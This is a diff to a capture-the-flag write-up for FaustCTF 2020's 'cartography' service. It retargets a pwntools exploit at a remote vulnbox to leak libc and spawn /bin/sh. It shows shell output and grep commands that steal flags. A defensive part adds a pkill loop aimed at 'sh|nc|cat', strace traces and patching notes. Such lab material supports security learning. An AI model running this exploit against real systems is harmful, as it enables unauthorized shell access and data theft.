@@ -304,9 +304,11 @@ Given all the analysis, the exploit is rather simple:
 from pwn import *
 
 binary = ELF('./cartography')
-libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+libc = ELF('libc-database/db/libc6_2.28-10_amd64.so')
 
-p = process(['stdbuf','-i0','-o0','-e0',binary.path])
+#p = process(['stdbuf','-i0','-o0','-e0',binary.path])
+p = remote('172.19.2.18', 6666)
 
 # null pointer
 p.sendlineafter('>','0')
@@ -334,7 +336,7 @@ p.sendlineafter('Enter the sector\'s size:\n','/bin/sh')
 p.interactive()
 ```
 
-Output:
+Output (from local vulnbox instance):
 
 ```bash
 # ./exploit.py
@@ -344,21 +346,61 @@ Output:
     Stack:    Canary found
     NX:       NX enabled
     PIE:      No PIE (0x400000)
-[*] '/lib/x86_64-linux-gnu/libc.so.6'
+[*] '/pwd/datajerk/faustctf2020/srv/cartography/libc.so.6'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    Canary found
     NX:       NX enabled
     PIE:      PIE enabled
-[+] Starting local process '/usr/bin/stdbuf': pid 25438
-[*] puts: 0x7f2fc91499c0
-[*] baselibc: 0x7f2fc90c9000
+[+] Opening connection to 172.19.2.18 on port 6666: Done
+[*] puts: 0x7fcb9aa02910
+[*] baselibc: 0x7fcb9a991000
 [*] Switching to interactive mode
+$ id
+uid=109(cartography) gid=116(cartography) groups=116(cartography)
+$ pwd
+/srv/cartography
 $ grep -Pahr FAUST_ data
+&\x00\x00\x00\x00AUST_XwjbvAGiAn7erlcAAAAABtp5nB/HgA9R
+&\x00\x00\x00\x00AUST_XwiWIAGiAikrbLMAAAAAIlwPKw1A6adC
+&\x00\x00\x00\x00AUST_XwinAAGiAhVYUrsAAAAA4pzCWXmUDTmn
+&\x00\x00\x00\x00AUST_XwjiEAGiAtVS0h0AAAAAPcqH+5WXZyah
 &\x00\x00\x00\x00AUST_XwjW0AGiAve+Il0AAAAA9G+mmfP1BCai
 ```
 
-> I used the attacker's `grep` command to get a flag.
+> I used the attacker's `grep` command to get a flags.
+
+Output with killer loop:
+
+```
+# ./exploit.py
+[*] '/pwd/datajerk/faustctf2020/srv/cartography/cartography'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] '/pwd/datajerk/faustctf2020/srv/cartography/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to 172.19.2.18 on port 6666: Done
+[*] puts: 0x7f9498c03910
+[*] baselibc: 0x7f9498b92000
+[*] Switching to interactive mode
+Sector created!
+Options:
+0. New Sector
+1. Update Sector Data
+2. Read Sector Data
+3. Save Sector
+4. Load Sector
+5. Exit
+```
+
+`/bin/sh` was killed and session returned back to menu.
 
 
 ## Defense
@@ -373,7 +415,7 @@ while :; do for uid in $(cat serviceusers); do pkill -U $uid 'sh|nc|cat'; done; 
 
 However, flags were still stolen.
 
-In the ~30 min I had the `strace` front-ending this service almost 6000 PID files were created.  We were getting pounded.  However, only 22 of the PIDs managed to get flags and used one of the following:
+In the ~30 min I had the `strace` front-ending this service 5628 PID files were created; we were getting pounded (but managed to kill 2487 shells, not every PID was a shell).  However, only 22 of the PIDs managed to get flags and used one of the following:
 
 ```
 execve("/usr/bin/strings", ["strings", "a54226d09ecb764feddf6df96a073bf9", "e655707a790f68faaaf769d65794a466", "00000000000000000000000000000000", "7c957eba39eb18d2a98b19552b1b66ac", "3818b68cd6d14ec622185e7cbe42acb4", "7ea93ad7510e629aa8e91f312b997387", "6d45d9eadb1bd3dfd1bedf0b2c68e969", "5b409e8d7028435b72912fa9e66f78aa", "2140e6ddd81d878f923e9d5507c877c5", "8fca86911b94382bd65cafd8648b5f7f"], 0x7fff4b292100 /* 12 vars */) = 0
@@ -388,13 +430,34 @@ Tracing a few of these back does reveal that `execve("/bin/sh", ["sh", "-c", ...
 > Note to self, block `execve`.
 > 
 > Only allow non-service accounts to run `/bin/sh` perhaps.
+> 
+> Add `strings`, et al to list.
+
+Local testing with unburdened vulnbox:
+
+```
+1594523547.773455 read(0, "/bin/sh\n", 4096) = 8
+1594523547.774690 rt_sigaction(SIGINT, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f8add77f840}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
+1594523547.774713 rt_sigaction(SIGQUIT, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f8add77f840}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
+1594523547.774728 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+1594523547.774744 clone(child_stack=NULL, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0x7ffd1e4cac1c) = 17547
+```
+
+`foo.17547`:
+
+```
+1594523547.820371 --- SIGTERM {si_signo=SIGTERM, si_code=SI_USER, si_pid=17548, si_uid=0} ---
+1594523547.820570 +++ killed by SIGTERM +++
+```
+
+I added timestamps to my local vulnbox, there's not a lot of wiggle room there, 0.045 seconds to get the loot.  Again, unburdened system.
+
+> Perhaps consider one loop per service.
 
 
 ### Surgical
 
 Ultimately, patching the service is the best approach, esp. if one of the services has a legit reason for using `sh|nc|cat`, e.g. a startup script.
-
-> Note to self, check `servicekil.log` sooner than later for collateral damage.
 
 The following will patch the binary so that if `NULL` is returned `local_108` will be set to zero, and the user will get an `Invalid range` error and returned to the top of the menu:
 
